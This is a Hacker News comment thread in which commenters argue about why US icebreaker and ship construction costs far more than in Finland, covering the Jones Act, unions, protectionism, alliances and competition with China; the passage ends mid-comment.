Axis. We could produce faster and cheaper. Read TFA. Faster, yes. Cheaper, no. Even after fully ramping up, Liberty ships cost considerably more to produce in the US than an equivalent ship elsewhere. In wartime that is acceptable. When you're producing for a global market, it's not. reply fsckboy 13 hours agorootparentprev>woefully uncompetitive. They produce single-digit numbers of commercial oceangoing ships annually, at 2-4x the cost of elsewhere unions and pro union legislation makes US shipbuilding uncompetitive. it also ruins US merchant marine. We could encourage it, but the world market is fairly competitive so we don't really need to, except for defense. reply bluGill 5 hours agorootparentOther countries have unions too. I don't know the situation in Finland, but they are surrounded by countries that have even stronger union and union laws that the US. (and some of those countries also have ship building) reply throwaway290 10 hours agorootparentprevThe question was, is it uncompetitive because self-imposed requirements/limtiations are stricter or because of lack of competence. You are answering something else reply delfinom 20 hours agorootparentprevThe same industry is currently crying they can't people to work the shipbuilding jobs. Heh reply faangguyindia 19 hours agorootparentprevRecently OpenAI is failing to compete with Google's hardware and has asked US government for 5Gigawatt data center. reply potato3732842 22 hours agoparentprevDon't forget that RFPs for this sort of thing get massively stuffed with pork so they're doomed to be bloated even regardless of the quality of the contractor who does the implementation. They love including requirements that all but mandates a specific vendor's product because that vendor is a key employer in the district of some rep's who's vote they need or has a good lobbyist or whatever. reply lcnPylGDnU4H9OF 22 hours agoparentprev> Put another way, are we spending all this time and money to fail at simply building a ship that is functionally identical to one of these ~$300m Finnish ice breakers, or are we claiming we need something more sophisticated? It sounds like it is the former. > If and when the ships are completed (currently 2029 for the first vessel at the earliest), they are expected to cost $1.7-1.9 billion apiece[0], roughly four to five times what a comparable ship would cost to build[1] elsewhere. 0: https://www.cbo.gov/system/files/2024-08/60170-Polar-Securit... 1: https://sixtydegreesnorth.substack.com/p/the-silicon-valley-... reply silexia 1 hour agoparentprevUnions in the US make for very high costs and long production schedules. reply SubiculumCode 14 hours agoparentprevThis episode of War on the Rocks: goes into some depth on the issue, if interested: Can ICE Pact Salvage American Shipbuilding? Episode webpage: https://warontherocks.libsyn.com/can-ice-pact-salvage-americ... Media file: https://traffic.libsyn.com/secure/warontherocks/WOTR_-_Icebr... reply wakawaka28 17 hours agoparentprevLabor is much more expensive in the US than elsewhere. That is the overwhelming burden in every industry. We need protectionist laws to guarantee that we can manufacture what we must have for strategic reasons, at minimum. reply JumpCrisscross 14 hours agorootparent> Labor is much more expensive in the US than elsewhere. That is the overwhelming burden in every industry This is true. But it’s not the root cause for our shipbuilding problems. Our dockworkers and shipbuilders are uniquely inefficient. reply wakawaka28 3 hours agorootparentMaybe our dockworkers and shipbuilders are dragging to extend contracts that they only got due to protectionist laws to begin with. If they had more work to do and more experience, they might become more efficient. reply ywvcbk 13 hours agorootparentprevI’m not sure labor costs could explain the difference the supposedly 5x difference in cost between Finland and the US. Labor is only a fraction of the overall cost and the difference is not that huge (e.g. average wage is $63k vs $50k). It’s more likely that US workers (in this sector) expect to get paid $100k to produce $20k of value (relative to other countries) reply wakawaka28 3 hours agorootparentOf course I'm not talking about averages. Average fast food workers make as much as engineers in some other countries. I'm not sure wages at the low-skill end are much lower in Europe, but certainly engineers seem to be paid less there. I assume that is similar across skilled professions. Comparing the US to Asia, yes the wage differences are across the board. reply mattmaroon 19 hours agoparentprevThe root cause is that naval warfare has practically no role in national security and hasn’t in a long time. Even ignoring nuclear weaponry and mutually assured destruction, ships are expensive and fragile. They are easily destroyed from above or below, which makes them only useful against nations that don’t have modern military technology. If you need a floating platform to fight Houthi rebels they’re useful, if we’re facing an actual invasion they’ll be worse than useless. As a result there’s not much pressure to get it right. If breaking ice were an activity that our national security relied upon I have no doubt we would be building them quickly. reply kjs3 18 hours agorootparentShips are useful for more than combat. Even icebreakers. reply mattmaroon 17 hours agorootparentDidn’t say they weren’t. But if they were useful for national security we’d be building them just fine. reply mmooss 21 hours agoprev> ... allowing the Coast Guard to buy icebreakers from Finland would likely save over a billion dollars per ship, as well as years of construction time How about we let Finland build the icebreakers, and we build something we're good at, like fighter planes? Then everyone gets the best and most efficiently built icebreakers and fighter planes, and all for much less money. There is no [edit: economic] logic to economic nationalism, other than as wealth transfer from taxpayers to a few wealthy people. reply 9dev 21 hours agoparent> There is no logic to economic nationalism, other than as wealth transfer from taxpayers to a few wealthy people. It doesn’t have to be that way, and phrased a little more benevolent, economic sovereignty is a good thing. It’s for that reason the EU has invested a lot of money into Galileo instead of just using GPS. Or look at the Ariane rocket program. It mandates an absurdly complex manufacturing schedule with thousands of European companies, effectively costing a lot more than just relying on SpaceX. At the same time, though, it creates a lot of jobs and distributes wealth throughout the union. Embezzling is a problem, and politicians funneling money to their cronies too. But it can be done differently. reply kazen44 21 hours agorootparentHaving your own manufacturing and industrial base is also very, very important from a geopolitical perspective. (as european countries have come to realise after the invasion of ukraine). you need your own industrial base to manufacture and develop the machinery you need to defend and project hard and soft power across the globe. Globalisation was supposed to \"solve this issue\" by making economies so interconnected that this would be no longer needed. Sadly, we have learned that that simply does not hold up. reply mmooss 21 hours agorootparent> Sadly, we have learned that that simply does not hold up. We've learned that the world now is more divided and violent than we had hoped, with the revisionist Chinese and Russians on one side and the US Republicans on the other (or sometimes on the same side as Russia!) So we depend more on the military, and also we can't depend on China's manufacturing to supply military goods. But can the US depend on Europe's, South Korea's, Japan's, Canada's, Australia's? I think so. Also, efficiency is everything in the competition with China: China, with ~ 4x the population of the US, can outproduce the US with just over 1/4 of the US's productivity. The US must maximize not only volume but productivity. Adding the countries listed above greatly increases volume, and the US can't afford the productivity cost of spending on inefficient manufacturers - the US needs to maximize output per dollar. reply aylmao 20 hours agorootparentI think I only partially agree with this. I do think the US can depend on Europe, Canada and Mexico. South Korea, Japan, and Australia are far from the USA and close to China. They have high incentive stay friendly with China. I do think China can easily outproduce the US. But I don't know that the US needs to maximize output per dollar. The USA can print dollars, and already creates a whole bunch of dollars out of thin air every year. The inflationary effect of printing a few more billion, specifically to maintain local shipbuilding capabilities, might be worth it. Just going for dollar efficiency has led the USA to de-industrialize, perhaps too much. The status quo can't be maintained, that's for sure. reply mmooss 12 hours agorootparent> South Korea, Japan, and Australia are far from the USA and close to China. They have high incentive stay friendly with China. While that was to some degree a concern years ago, before Biden took office, those countries have decisively and openly taken sides with the US and are members of a network of alliances that also includes The Philipines and, to a degree, India. The US has been building and improving bases, military training, etc. in and with those countries and all over the region For example, there is AUKUS, a major agreement between the US, Australia, and also the UK, for Australia to become the only country outside the UK to receive one of the US crown jewels, nuclear submarine technology. Australia also is hosting an expanding number of US bases. > I don't know that the US needs to maximize output per dollar. The USA can print dollars, and already creates a whole bunch of dollars out of thin air every year. The inflationary effect of printing a few more billion, specifically to maintain local shipbuilding capabilities, might be worth it. The economics is trickier than that: Production is real economic value; printing money is just a statistic. Productivity = output/dollars. If you increase the dollars in that equation, you don't change the output and you reduce the nominal productivity number (though usually it's measured using inflation-adjusted dollars, so it's really unchanged). The US can increase output by borrowing more dollars, increasing the volume of investment in shipyards without increasing productivity. But borrowing does cost something - IIRC the debt payments will soon exceed the military budget - and can cause inflation, which eventually negatively impacts output. In the end, China may be able to invest far more. > Just going for dollar efficiency has led the USA to de-industrialize, perhaps too much. What connection is there? reply Terr_ 18 hours agorootparentprev> the revisionist Chinese and Russians Or perhaps \"revanchist\", meaning that they want to conquer some territory they believe (or at least pretend) used to be theirs. reply danenania 14 hours agorootparentprevIf you're measuring in decades, can you take any alliance for granted? Things can change in unpredictable ways. Taking Europe as an example, if Trump or someone like him decides to leave Europe to its own devices while facing an aggressive Russia, we could see massive re-militarization. Who can say where a shift like this would lead? It's easy to view these countries as permanent allies when they depend on us for security, but they might not be so cooperative once they can stand up for themselves militarily. This applies to Japan and South Korea as well vis a vis China/NK. reply mmooss 12 hours agorootparentNATO, as well as the rest of the Atlantic relationships that form the 'West', has worked very well for 90 years, and NATO is still growing and strengthening. Anything can happen, but that's not rational. Rationally, we need to anticipate what is likely and not treat risk as if it's all random, coin-flip, unpredictable chaos. reply danenania 12 hours agorootparentTo me it seems more rational to be ready for a wide range of outcomes than to assume the next 90 years will be similar to the previous 90 years. reply mmooss 12 hours agorootparentI agree; I meant that we need to rationally assess what outcomes are more likely and plan according to that, not treat every outcome as equally likely. And not only plan, as if we are passive victims of history, but make it happen - invest in NATO, etc. reply danenania 12 hours agorootparentSure, but assuming we remain a democracy, or some approximation of one, we're always going to be a bit schizophrenic in our policies. Any particular administration can try to go in one direction or the other, but they have to be aware that their successor (or the one after) could very well undo all their actions and take the exact opposite course. So in terms of long term planning, I think hedging our bets make sense. It might be a good idea to invest in NATO, but we also don't want to be left in a highly vulnerable position in 10-20 years if NATO falls apart and our current allies stop giving us free trade agreements, because that's a real possibility. reply mmooss 11 hours agorootparentI won't keep going in circles, but focus on this point: > Sure, but assuming we remain a democracy, or some approximation of one, we're always going to be a bit schizophrenic in our policies. Any particular administration can try to go in one direction or the other, but they have to be aware that their successor (or the one after) could very well undo all their actions and take the exact opposite course. The idea that democracies are less stable and predictable doesn't bear out in reality. They are the most stable and predictable forms of government, because they have many checks on their power: Free press, legislatures, competitive elections, etc. expose fraud and incompetence to their disinfectent, sunlight. The rule of law means that officials serve the law and the people, not a person. Putin is not someone you trust to keep their word in a deal with you. Government by dictators is less stable: They lack the essential things above, and are subject to one person's whim - a person inevitably corrupted by their power. They change power through violence, which makes them even more unstable. And to circle back after all to the evidence right in front of us: NATO has lasted 90 years so far. The US has greatly expanded and deepened its alliances in East Asia over the last 4 years. Now name an ally China or Russia has. They don't - dictators don't have allies on that level; nobody actually likes their values and wants them to succeed. China and Russia's current relationship is nothing like the US's with NATO; reply ywvcbk 13 hours agorootparentprev> Things can change in unpredictable ways. When you do stupid and unpredictable things? Certainly. But that seems like an internal US problem. Of choice rebuilding local manufacturing might be easier than fixing that in theory. OTH the longterm cost would like be much higher due to lower global stability. reply philwelch 21 hours agorootparentprev> But can the US depend on Europe's, South Korea's, Japan's, Canada's, Australia's? I think so. If our goal is to be robust against the risks of a great power conflict, we can't necessarily depend on manufacturing from these countries because a great power conflict might either overrun or cut off our supply lines to these countries. In fact, control over East Asian shipping lanes is the central point of the current cold war with China. reply mmooss 12 hours agorootparentI agree there is some risk for the East Asian countries. I think China would be hard pressed to stop all that production and trade, but certainly they could impact it and who can say what a 21st century war would look like? Still, it's a risk, not a deal killer. China could bomb US production too. reply umbra07 12 hours agorootparentChina can't bomb American production unless we suffer absolutely catastrophic, unimaginable, WW3-escalatory levels of naval losses in the Pacific (because Chinese bombers from the Chinese mainland don't have the range to reach the American mainland). reply mmooss 11 hours agorootparentI'm not sure that's true. The US can't defend an entire Pacific front, obviously, and has a shortage of ships, many of which will be busy doing other things. Anyway, I was thinking of missiles, which China has many of, and which can reach the US (including from submarines and other ships that can maneuver closer to the US). reply shiroiushi 19 hours agorootparentprevThe US doesn't have too much trouble manufacturing things like aircraft carriers and submarines and 5th-gen fighter jets and missiles, and indeed builds plenty of those, even exporting some. It does have trouble building an icebreaker, but it doesn't need those very often, so it can't keep any company interested in the business when it only wants one every ~30 years or whatever. It doesn't make sense to spend a ton of money just to build one ship, when they can just buy it from Finland. reply mmooss 12 hours agorootparentFWIW, the US does have problems producing ships. For example, the US military and Congress very much want to increase the rate of submarine production, and haven't been able to do it. If you look at current news, you can see the desperate measures they are pursuing. reply mmooss 21 hours agorootparentprev> It doesn’t have to be that way, and phrased a little more benevolent, economic sovereignty is a good thing. It’s for that reason the EU has invested a lot of money into Galileo instead of just using GPS. Or look at the Ariane rocket program. You haven't established that it's a 'good thing', but it does exist. I don't suppose Galileo is about economic sovereignty as much as strategic military independence. Modern militaries require satellite PNT systems - they are necessary to precision munitions, without which your military operates on a 1980s level. As close as the EU-US military relationship is, they perhaps don't want to give the POTUS a button to shut down, e.g., a French military operation. The POTUS might like Galileo too - they might not want the pressure to use that power. (I'll skip having another HN SpaceX discussion!) > it creates a lot of jobs and distributes wealth throughout the union Or it just shifts money and jobs from all people - the taxpayers (including businesses) - to a few, the ones that get those jobs and especially the business owners. It's arguably better to just give people the money and have them do something they can do efficiently. It's make-work welfare, in a way. reply 9dev 6 hours agorootparentThe point I was trying to make was that keeping the technological manufacturing expertise alive is valuable in itself, even besides the geopolitical advantage of having the system itself in place. By retaining the ability to get payloads into space and use as well as operate an independent positioning system, even if a political conflict with former partners arises, the EU can make its foreign policy decisions without fear of retaliation through technology dependencies—or phrased differently, we avoid being vulnerable to extortion. The key to this ability really is to keep the knowledge alive and the related industries strong, to be able to tap into it when it's necessary. And that involves having a broad range of companies actively involved into creating critical components. reply cgh 21 hours agoparentprevCanada has 20 light and medium icebreakers and just started a new project to build two more that will apparently \"be among the most powerful conventional icebreakers in the world\": https://www.canada.ca/en/public-services-procurement/service... Given the close economic and cultural ties of these countries, surely some kind of knowledge transfer could happen, if not actual nearshoring the construction. Could NAFTA (or whatever it's called now) be used to get around the Jones Act somehow? reply mmooss 21 hours agorootparentFinland is a NATO ally; but sure Canada makes sense too. And Norway and Sweden and whoever else might have the skills and experience. reply stevekemp 15 hours agorootparentFor clarity Finland is a full member of NATO, as of 4 April 2023. Perhaps that's what you meant, but Ally makes it sound like they're friendly with NATO rather than an actual member. reply cgh 21 hours agorootparentprevCanada is a founding member of NATO. reply mmooss 21 hours agorootparentYes; I meant that Finland has a pretty good relationship with the US; I didn't say anything about Canada and NATO. reply cgh 19 hours agorootparentMy mistake, sorry. I thought you were implying Canada wasn't a NATO member. I agree with your economic nationalism comments. But Canada is in a special position here: the US Arctic is contiguous with Canada's much larger Arctic region and a US/Canada icebreaking partnership seems to make sense. The US nationalists might be okay with it because of NAFTA, generally close economic ties and the whole \"fortress North America\" thing. Canada has at least two shipyards capable of building icebreakers and the US has money. Another example of this close, almost ambiguous economic relationship: the US Department of Defense is funding Canadian mining juniors. I have never heard of this happening before: https://www.defense.gov/News/Releases/Release/Article/377704... reply wmoxam 14 hours agorootparentCanada and the US have some disagreements about the arctic, particularly about the Northwest Passage: https://brownpoliticalreview.org/2020/04/the-u-s-canada-nort... That's got to be a factor here reply mmooss 12 hours agorootparentprev> The US nationalists might be okay with it because of NAFTA Why are nationalists ok with NAFTA, which is just like any other international fre trade agreement? Is it because Trump backed it - meaning, of course, that they aren't nationalists but Trumpists. reply EasyMark 18 hours agoparentprevI've always heard people say nationalism is a good thing and globalism is the solution, yet they never have an answer to what do you do when China controls every supply chain and then decides to bulldoze Taiwan and we then go to war with them? All the market advantages and globalism in the world goes out the window and you can't do much more than capitulate to a bully. reply mmooss 12 hours agorootparent> they never have an answer to what do you do when China controls every supply chain and then decides to bulldoze Taiwan and we then go to war with them? All the market advantages and globalism in the world goes out the window and you can't do much more than capitulate to a bully. That was a complaint many years go, but things have changed dramatically: The US now is 'decoupling' its economy from China, and moving production to friendlier countries, and the US encourages and arranges for allies to do the same. The US and its Pacific allies are also intensely preparing for possible warfare with China. Just because China is not a reliable partner doesn't mean the US should throw out all other partners. Should the US not buy icebreakers from Canada and Finland because of China? That would be greatly hamstrining the US. China's government would love it, I think. reply naming_the_user 18 hours agorootparentprevPresumably you need to monitor the situation and require that there's a significant enough amount of interdependence. The issue with China is that they don't need the US as much as the US needs them. reply dudefeliciano 10 hours agorootparentprevWho ever said that nationalism is a good thing, apart from nationalists? “Nationalism is an infantile disease, it’s the measles of mankind.” -Albert Einstein reply carlosjobim 4 hours agorootparentThe globalists, when it's time to go to war again. The same people who said you are a racist and fascist if you wave the flag have already done about face and now say it's the duty of young men and women to die for their country. \"Everybody for themselves, we're individuals\" when there's peace and \"We're all in this together, you've got to die for your country\" when their wealth is threatened. reply mmooss 5 minutes agorootparentYou have a point, IMHO, but it doesn't leave room for another group: Humanitarians who believe in human rights as fundamental. That is counter to nationalism (which says the 'nation' is fundemental - the nation being the nationalist powerbrokers); it assumes all have inalienable equal rights, regardless of where political borders are drawn. Sometimes you need to get together and fight for human rights. But even as WWII was going on, Churchill, for example, was IIRC a harsh critic of nationalism. reply llamaimperative 21 hours agoparentprevWell, there is “a logic,” whether you agree with it or not, that it’s strategically important even if commercially suboptimal for us to have a domestic shipbuilding capability. reply everybodyknows 20 hours agorootparentIt is strategically critical to maintain friendly relations with Finland, Canada, and South Korea, all of which would be happy to sell icebreakers. If those countries were to become unreliable, the US will have problems a whole lot than a shortage of icebreakers. reply mmooss 21 hours agorootparentprevYes, I meant economic logic. I updated my comment, thanks. reply gavindean90 19 hours agoparentprevI’m with you as long as the country building it is a nato member reply xp84 21 hours agoparentprevYes, it’s tragic. Even if you consider the job losses. We’d be better off paying those same shipbuilders to do Sudoku puzzles, with HALF the money we save on the ships. A billion bucks per ship would go a LONG way. I mean, ideally we could try to not suck at building ships economically, though. But that’s a lot harder to figure out given how it’s a political problem. reply cyberax 21 hours agoparentprev> How about we let Finland build the icebreakers We can't. Jones Act. reply mmooss 21 hours agorootparentWe can change the law. It happens every day. reply roywiggins 21 hours agorootparentEspecially since Congress needed to allocate funds for the project anyway, just pass a law that says \"buy some ice breakers from Finland, notwithstanding any other laws, and here's 1 billion dollars to do it.\" reply xyzzyz 15 hours agorootparentprevYes, but repeals of very actively enforced law that's over 100 years old do not happen every day. reply roywiggins 21 hours agorootparentprev\"The culprit here isn’t the Jones Act, but another protectionist shipbuilding law that requires Naval and Coast Guard ships to be built in U.S. shipyards. It’s possible to waive this requirement via presidential authorization[0], but there hasn’t appeared to be much interest in this.\" [0] https://sixtydegreesnorth.substack.com/p/yes-the-us-coast-gu... \"In practice Congress would need to support such a plan by appropriating funds for the project.\" reply quasse 22 hours agoprev> We also see the same cultural issues that we saw with American shipbuilding more broadly. There seems to be a lack of motivation to take maritime issues seriously or treat them as important. This is the meat of the article in my mind. The US has globalized away its maritime industry in general and we now lack the institutional knowledge, infrastructure, and labor force needed to operate even semi-independently on the maritime front. Just look at our domestic shipbuilding capacity vs. China: https://www.americanmanufacturing.org/blog/chinas-shipbuildi... WA state has the same problem trying to get ferries built for the Puget sound. Every decade the fleet gets more dilapidated and the replacements get more expensive and farther behind schedule. The legislature has ditched the requirements that the boats be built at a WA shipyard and they still can't find builders. reply cyberax 21 hours agoparent> The US has globalized away its maritime industry It hasn't. Jones Act _protects_ the US maritime industry, so it stagnated and died. Nobody wants the US ships unless they have to use them, they're crap compared to ships from other countries. > and they still can't find builders. That's because shipyards are basically a defense industry subsidiary. So they receive a fixed amount of orders, and it's known for years in advance. The shipyards are also unionized to hell and back, with VERY cushy contracts. So shipyards can't hire temporary workforce for a given project. reply cogman10 20 hours agorootparent> The shipyards are also unionized to hell and back, with VERY cushy contracts. The problem here isn't the unions, it's the fact that we privatized building ships. It's yet another example that privatizing all parts of the government is a fundamentally bad idea. Government goals do not align with private industry goals and private industry, particularly in a well captured market like defense and ship building, gets to command insane prices because they know the US will pony up. The reason the US was able to make advanced navy ships right up until the 80s is because shipbuilding was done by public industry. Insanely, Clinton and Reagan started the process of privatizing our fleet capabilities and it's landed us exactly where you think it would. The reason we don't have ice breaker ships being built is because it's a niche market and ship builders are all too happy to say \"no\" or to charge an exorbitant price so the US military will go away. reply xyzzyz 15 hours agorootparentSorry, what are you talking about? None of this is true. Government-owned shipyards were not historically responsible for significant fraction of delivered tonnage. In fact, given the utter atrophy of private shipbuilding industry in US today, I wouldn't be surprised if the percentage of tonnage delivered by government owned shipyards today was higher than ever. reply roenxi 20 hours agorootparentprevI see downvotes at the time I commented, which is unfortunate as ideas should be at least explored. Someone on the internet has been keeping statistics [0] that do suggest the collapse in output happened in the 1980s. But on the other hand, the same stats show a steady decline in the number of companies from 1950 that was only stabilised after the collapse in output, so it is probably arguable that the high-production situation was unsustainable. Economics can be complex. [0] http://shipbuildinghistory.com/statistics/decline.htm reply xyzzyz 15 hours agorootparentYes, the collapse has happened, but it had not happened due to \"privatization\" of government shipyard. These were all privately owned shipyard that collapsed. The comment you are responding to is inventing some kind of alternative history that simply has not happened, and probably this is why it's downvoted. reply ronjakoi 20 hours agorootparentprevI can assure you, shipyards here in Finland are just as, if not more, unionized. reply arthurjj 20 hours agorootparentThis is a common communication problem between Americans and Europeans where we're using the same word to mean two different types of organization. In the US you should replace \"union\" with \"cartel, likely criminal\" eg the boilermakers \"A federal grand jury in Kansas returned an indictment yesterday charging seven defendants, including five current and former high-level officers of the International Brotherhood of Boilermakers, Iron Ship Builders, Blacksmith, Forgers and Helpers (Boilermakers Union) for their alleged roles in a 15-year, $20 million embezzlement scheme.\" https://www.justice.gov/opa/pr/two-former-presidents-boilerm... reply Teever 18 hours agorootparentMaybe the problem isn't with American unions, it's with American corruption. In other words maybe there's just less corruption in Finland. reply leshow 17 hours agorootparentprevI would guess the shipbuilding industry in Finland is also built on subsidy and \"protectionism\" just like every other successful industry too. A cursory google search shows millions that were made available to shipbuilders: https://www.businessfinland.fi/en/for-finnish-customers/serv... I'd bet that's just scratching the surface. The only way any country has been able to develop their productive capacities is through public grants and subsidies. The history of US industry shows the same thing, research in materials, electronics, the internet, etc were all accomplished through publicly funded research. reply roenxi 20 hours agorootparentprevIt seems quite likely that Finish unions work differently to US ones. The legal details and organisational traditions matter. reply jltsiren 19 hours agorootparentIt's just free markets in action. Finland is a small country that depends on international trade. Industries must remain competitive or go out of business. Unions that harm the competitiveness too much won't survive in the long term. US domestic market is much larger. Uncompetitive industries can survive on domestic demand. Especially with some regulations that help. It doesn't even have to be explicitly protectionist regulation. Just regulate things the way Americans consider the best, instead of adopting international standards. That can create sufficient barriers to entry to allow uncompetitive industries and uncooperative unions survive. reply themaninthedark 19 hours agorootparentprevThe Jones Act only protects a very small part of US shipbuilding industry, those ships which will be used to ship goods between US ports. Somehow the magical thinking here is that, if you allowed everyone to buy ships from anywhere they would buy more American made ships but because it is mandated that you buy American made ships for certain tasks, suddenly the industry is noncompetitive. The reality of the situation is that the Jones Act is the only thing keeping the last vestigial of the shipbuilding industry alive. There are some inefficiencies in the industry it's self but for the most part, the primary drivers for the increased costs were related to the regulatory environment of the US(environmental, worker protection, etc), now there are even greater costs due to network effects of related industries having shrunk or died out. Similar to posts about machine tools or electronic design, everyone talks about how in China its so much easier to get stuff done because the Fab shops are all next door and nothing like that exists in the US, you used to have more steel mills, fabricators and machine shops. Now there are fewer and further apart. Network effects matter. reply skhunted 21 hours agorootparentprevUnionized workers can be hired on a temporary basis. By cushy contracts this means that the amount of wealth extraction from workers is not as great as it is in other American industries. reply cyberax 21 hours agorootparent> Unionized workers can be hired on a temporary basis With these unions (\"Boilermakers\")? No chance. They can officially give their jobs to their _children_ upon retiring. There is a waiting list for apprenticeships. You have to complete 8000 hours of apprenticeship, even if you are already qualified. > By cushy contracts this means that the amount of wealth extraction from workers is not as great as it is in other American industries. WA is ordering ferries at $1.5B per item. They cost 20 _times_ less if ordered from Turkey. This is not \"wealth extraction from workers\", this is \"sucking on the teat of taxpayers\". reply vlovich123 20 hours agorootparentFor what it’s worth American workers as a whole make ~20x what Turkish workers do. While American shipbuilders make more than the average while Turkish ones are closer to their average countrymen, the 20x discrepancy in salaries doesn’t seem limited to shipbuilding. So not sure about the characterization of “sucking on the teat of taxpayers” per se vs overall higher regulations and salaries in the US. reply cyberax 20 hours agorootparent> For what it’s worth American workers as a whole make ~20x what Turkish workers do. It's about 7x. > 20x discrepancy in salaries Not salaries. The end-product costs. reply vlovich123 11 hours agorootparentAverage national salary in the US $60k [1] vs 5k for turkey so closer to 11-12x (the coasts typically pay closer to 70k). So at most unions are costing US built ships to be twice as expensive due to unions and overall higher US wages are responsible for the price difference - difficult to compete on price with people that are willing to work for 1/10th your wage unless you can automate significantly more than them. [1]: https://www.usatoday.com/money/blueprint/business/hr-payroll... reply xyzzyz 15 hours agorootparentprevUS-built cars do not cost 20 times that of Turkey-built cars. reply vlovich123 11 hours agorootparentUS built cars are automated like crazy, have a lot of experience scaling, and save significantly on shipping costs. reply LorenPechtel 21 hours agorootparentprevHire who? There won't be other skilled people. And cushy contracts mean products that are considerably more expensive. Pretty much the only unionized industries left are those where they are somehow protected from competition. That's because union products cost enough more to drive them out of the market. reply bumby 20 hours agorootparentI don’t think it’s coincidence that the American addiction to cheap shit coincides with lower union membership and a shrinking middle class. reply bgnn 21 hours agorootparentprevIsn't it a similar case with the American busses? They are crap because they're protected? Similar with Boeing too. reply leshow 18 hours agorootparentThe decline in quality of out Boeing has coincided with a collapse of the regulatory framework that kept profit extraction limited since the 70's and 80's. Now you've got the worst of both worlds, where the industry is protected and subsidized, production gets off-shored and outsourced anyway while massive profits flow into shareholders pockets in the form of stock buybacks. It's funny that you look at this and blame the protectionist aspect when \"protectionism\" literally built the industry in the first place. Every country who isn't just getting exploited for their natural resources or labor has built their industry by protecting it. reply daveguy 13 hours agorootparentWhen did the regulatory framework collapse? 90s? Was there a specific bill? reply leshow 53 minutes agorootparentTake a person with a full head of hair and remove one hair, are they bald? Remove another one, bald? Clearly not, but if you keep removing hairs at some point you have a head we consider bald. Deregulation has been working like that. It's hard to point to one discrete event. In any case, the process really got going under Jimmy Carter. If we're talking about airlines, I guess you could point to the Airline Deregulation Act. The airline industry had been built in the first place by what people in this thread would call \"protectionist\" policies. Stock buybacks are a big part of the story as well. These were illegal market manipulation I think from the Great Depression until the 80's under Reagan. reply decafninja 20 hours agorootparentprevWhat’s the general consensus on the state of US Navy ships? The most recent classes seem riddled with various problems - see Zumwalt, LCS, Constellation. I suppose the Ford is relatively ok. reply observationist 21 hours agorootparentprevWhat do you think globalizing means? Ships are too expensive to be built to a given level of quality in the US. This means we outsource the expertise, and in this case, even the expertise necessary to tell what a good deal is. They've created a market in which a US based company cannot compete economically, because the cost of production elsewhere will be less. There is no margin by which any competition can take place, whether or not the government throws a ton of money and stopgap incentives into the mix. You can't manufacture chips, small household goods, general purpose clothing, electronics, or a whole slew of other things in the US because our legal regime fundamentally disallows any American participation in those markets through economic disincentivization. If you can't make any profit because you have to pay higher wages or taxes if you manufacture in the US, then you're not going to manufacture in the US, even if you're a patriot. The US doesn't have a rational system designed to maximize value to citizens, it's a hodgepodge of conflicting regulatory grifts designed to maximally benefit the corporations who paid for the lobby. > they're crap compared to ships from other countries. That's exactly what \"globalizing\" is. You literally cannot, under the current regulatory regime, create a ship building company that can compete with other established interests and competition from other countries. You'd have to relax the arbitrary labor and wage constraints, fix taxes and tariffs for sufficiently long term outlooks that anyone would bother investing. To achieve that, you'd need good faith operators throughout the government willing to rock the boat, and if you think that will ever happen, I've got a bridge in Brooklyn for ya - I'll sell it cheap. reply foota 21 hours agorootparentOther industries seem to be fine competing with other countries. Would there be some greater investment in manufacturing in the US if there were no labor (or environmental) constraints? Sure, but the fact that other industries compete just fine makes me believe it's simply not an economically efficient allocation of resources for labor heavy manufacturing to be done in the US. reply toomuchtodo 21 hours agorootparentWhat industries? Steel? Protectionism. Batteries? Protectionism. Solar? Protectionism. Autos? Protectionism. Aircraft? Protectionism. Agriculture? Protectionism. Why? Because efficiency is a tradeoff where you give up security and resiliency. reply cyberax 21 hours agorootparent> What industries? Steel? Protectionism. The US imports steel, and the protectionist regime almost killed the US steel: https://reason.com/2024/01/02/protectionism-ruined-u-s-steel... > Batteries? Protectionism. Solar? Protectionism. That's relatively new, and it _will_ lead to disaster. The US is already falling behind in battery tech compared to China and South Korea. > Autos? Protectionism. Aircraft? Protectionism. Need I remind you of Detroit and its handling of cheap Japanese imports in 70-s and 80-s? Aircraft are only slightly protectionist, the US companies can (and do) buy foreign aircraft (Airbuses and Embraers are commonplace). reply toomuchtodo 20 hours agorootparentChina is winning because they are intentionally and directly investing in tech regardless of the financial circumstances. They don’t care about the profits, they are focused on the outcomes. They are doing what developed countries should be doing. https://en.wikipedia.org/wiki/Made_in_China_2025 reply decafninja 20 hours agorootparentThey’re also an authoritarian state that doesn’t have to worry about various pesky things that grind Western democracies to a halt. If the Pharoah wants a fleet of aircraft carriers, the Pharoah will have a fleet of aircraft carriers. reply toomuchtodo 20 hours agorootparentWinning is winning. History is written by the victors. Important to know who you’re playing against, and whether you’re playing by the same rules, and if the rules matter. It’s not great, but it is what it is. We must operate in a way based upon how the world is, not the way that we wish it was. reply decafninja 20 hours agorootparentAt this point, China is outdoing the West in so many ways, and rapidly catching up in the areas where it still lags. I’m not one to eagerly praise the CCP, but it’s hard to not see how China is progressing while the West lags more and more. The West plays nice as much as possible. China is playing to win. reply hollerith 20 hours agorootparent>China is outdoing the West in so many ways, and rapidly catching up in the areas where it still lags. I'm not seeing it. Chinese economic power and tech capacity might exceed US capacity in time, but I give it only p = .25 or so. China's descending into some sort of political chaos seems more likely. reply toomuchtodo 20 hours agorootparenthttps://www.aspi.org.au/report/critical-technology-tracker > Our research reveals that China has built the foundations to position itself as the world’s leading science and technology superpower, by establishing a sometimes stunning lead in high-impact research across the majority of critical and emerging technology domains. > China’s global lead extends to 37 out of 44 technologies that ASPI is now tracking, covering a range of crucial technology fields spanning defence, space, robotics, energy, the environment, biotechnology, artificial intelligence (AI), advanced materials and key quantum technology areas. The Critical Technology Tracker shows that, for some technologies, all of the world’s top 10 leading research institutions are based in China and are collectively generating nine times more high-impact research papers than the second-ranked country (most often the US). Notably, the Chinese Academy of Sciences ranks highly (and often first or second) across many of the 44 technologies included in the Critical Technology Tracker. We also see China’s efforts being bolstered through talent and knowledge import: one-fifth of its high-impact papers are being authored by researchers with postgraduate training in a Five-Eyes country. China’s lead is the product of deliberate design and long-term policy planning, as repeatedly outlined by Xi Jinping and his predecessors. Emphasis mine. reply decafninja 19 hours agorootparentprev> China's descending into some sort of political chaos seems more likely, like it has done over and over thru history. And the West isn’t? I honestly am not sure whether I prefer Xi Jinping over one of the candidates in the upcoming US elections. There are still thankfully some checks and balances in place, but if the loudest elements of one of the two major US parties has everything their way, I’d honestly prefer to live in the PRC. reply leshow 18 hours agorootparentprev> The West plays nice as much as possible. Please, tell us how you came to this conclusion reply cyberax 20 hours agorootparentprev> China is winning because they are intensely, directly investing in tech 